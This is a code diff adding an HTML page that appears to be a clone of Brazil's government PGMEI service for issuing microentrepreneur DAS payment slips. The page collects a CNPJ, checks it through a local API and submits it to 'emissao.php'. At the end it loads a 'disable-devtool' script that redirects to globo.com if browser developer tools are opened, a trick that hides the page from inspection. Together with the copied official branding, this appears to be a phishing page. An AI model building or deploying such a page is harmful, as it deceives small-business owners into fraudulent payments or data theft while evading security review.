@@ -1,0 +1,175 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>
+    <link href="assets/css/pgmei.css" rel="stylesheet">
+    <script src="assets/js/modernizr.js"></script>
+    <script src="assets/js/spin.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Ladda/1.0.6/ladda.min.js" referrerpolicy="no-referrer"></script>
+</head>
+<body>
+    <div class="container-fluid">
+        <header class="row">
+            <h3><span class="label label-success"><img alt="Brand" src="assets/images/logo-simples.png"> PGMEI</span></h3>
+            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
+        </header>
+        <section class="row">
+            <div class="well col-md-12" role="main">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-offset-3 col-md-5">
+                            <div class="panel panel-default">
+                                <div class="panel-heading">
+                                    <h4 class="panel-title">Informe o numero completo do CNPJ</h4>
+                                </div>
+                                <div class="panel-body">
+                                    <form id="consultaForm" action="emissao.php" method="POST">
+                                        <input type="hidden" name="csrf_token" value="87d531e94549906d2d94896e987bdda771d64e2a00a4674d88dbb7c226534245">
+                                        <div style="position: absolute; left: -9999px; top: -9999px;" aria-hidden="true">
+                                            <input type="text" name="website_url" tabindex="-1" autocomplete="off">
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="col-md-offset-1 col-md-10">
+                                                <div class="form-group">
+                                                    <label for="documento_consulta" class="control-label">CNPJ completo:</label>
+                                                    <input type="tel" id="documento_consulta" class="form-control" name="doc_4e4a0123080c9ee9"
+                                                        inputmode="numeric" autocomplete="off" maxlength="18" placeholder="00.000.000/0000-00" required
+                                                        ondrop="return false;">
+                                                   
+                                                    </div>
+                                                <div style="color: #555; font-weight: 500; font-size: 8px; line-height: 12px;">
+                                                    <strong> Protegido por hCaptcha </strong> <br>
+                                                    <a href="https://hcaptcha.com/privacy"> Privacidade</a> e
+                                                    <a href="https://hcaptcha.com/terms"> Termos e condicoes</a>.
+                                                </div>
+                                                <br>
+                                                </div>
+                                            </div>
+                                            
+                                            <br><br>
+                                            <div class="col-md-offset-1 col-md-10">
+                                                <button id="consultarBtn" type="submit" class="btn btn-success ladda-button" data-style="slide-left">
+                                                    <span class="ladda-label">Continuar</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </form>
+                                    <div id="loading" style="display:none;"></div>
+                                    <div id="error-message" style="display:none; margin-top:10px; color:red;"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer class="row clearfix">
+            <div class="pull-left"><p class="text-success"><strong>Versao: 3.17.0</strong></p></div>
+            <div class="pull-right"><img src="assets/images/marca_Simples_entes.png" alt=""></div>
+        </footer>
+    </div>
+    <script src="assets/js/jquery.js"></script>
+    <script src="assets/js/bootstrap.js"></script>
+    <script src="assets/js/ladda.js"></script>
+    <script src="assets/js/toastr.js"></script>
+    <script src="assets/js/select.js"></script>
+    <script src="assets/js/pgmei_old.js"></script>
+    <script src="assets/js/pgmei_layout.js"></script>
+    <script>
+    var cnpjInput = document.getElementById('documento_consulta');
+    
+    cnpjInput.addEventListener('input', function(e) {
+        var value = this.value.replace(/\D/g, '').substring(0, 14);
+        this.value = formatCNPJ(value);
+    });
+    
+    cnpjInput.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey || e.metaKey) && ['a', 'c', 'v'].includes(e.key.toLowerCase())) return;
+        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'x') { e.preventDefault(); return; }
+        if (e.shiftKey && e.key === 'Insert') return;
+        if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End'].includes(e.key)) return;
+        if (!/[0-9]/.test(e.key)) e.preventDefault();
+    });
+    
+    cnpjInput.addEventListener('drop', function(e) { e.preventDefault(); });
+    
+    function formatCNPJ(value) {
+        if (!value) return '';
+        value = value.replace(/\D/g, '').substring(0, 14);
+        var formatted = value;
+        if (value.length > 2) formatted = formatted.replace(/^(\d{2})(\d)/, '$1.$2');
+        if (value.length > 5) formatted = formatted.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
+        if (value.length > 8) formatted = formatted.replace(/^(\d{2})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3/$4');
+        if (value.length > 12) formatted = formatted.replace(/^(\d{2})\.(\d{3})\.(\d{3})\/(\d{4})(\d)/, '$1.$2.$3/$4-$5');
+        return formatted;
+    }
+    
+    document.getElementById('consultaForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var cnpj = cnpjInput.value.replace(/\D/g, '');
+        var errorDiv = document.getElementById('error-message');
+        var btn = document.getElementById('consultarBtn');
+        var csrf_token = document.querySelector('input[name="csrf_token"]').value;
+        
+        errorDiv.style.display = 'none';
+        
+        if (cnpj.length !== 14) {
+            errorDiv.textContent = 'CNPJ incompleto. Digite os 14 numeros.';
+            errorDiv.style.display = 'block';
+            btn.disabled = false;
+            setTimeout(function() { errorDiv.style.display = 'none'; }, 5000);
+            return;
+        }
+        
+        // Validar CNPJ via API
+        btn.disabled = true;
+        var formData = new FormData();
+        formData.append('cnpj', cnpj);
+        formData.append('csrf_token', csrf_token);
+        formData.append('action', 'validate');
+        
+        fetch('api_mei_direto.php', {
+            method: 'POST',
+            body: formData,
+            credentials: 'same-origin',
+            headers: { 'Accept': 'application/json' }
+        })
+        .then(function(response) { return response.json(); })
+        .catch(function(error) { return { sucesso: false, mensagem: 'Erro ao consultar API' }; })
+        .then(function(resultado) {
+            btn.disabled = false;
+            
+            if (resultado && resultado.sucesso !== false) {
+                cnpjInput.value = formatCNPJ(cnpj);
+                
+                setTimeout(function() {
+                    document.getElementById('consultaForm').submit();
+                }, 200);
+            } else {
+                var mensagem = resultado && resultado.mensagem 
+                    ? resultado.mensagem 
+                    : 'CNPJ nao localizado. Verifique os dados.';
+                
+                errorDiv.textContent = mensagem;
+                errorDiv.style.display = 'block';
+                setTimeout(function() { errorDiv.style.display = 'none'; }, 5000);
+            }
+        });
+    });
+    
+    Ladda.bind('.ladda-button');
+    cnpjInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') { e.preventDefault(); document.getElementById('consultaForm').dispatchEvent(new Event('submit')); }
+    });
+    cnpjInput.focus();
+    </script>
+
+        <script disable-devtool-auto url='https://www.globo.com' src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>
+
+
+</body>
+</html>
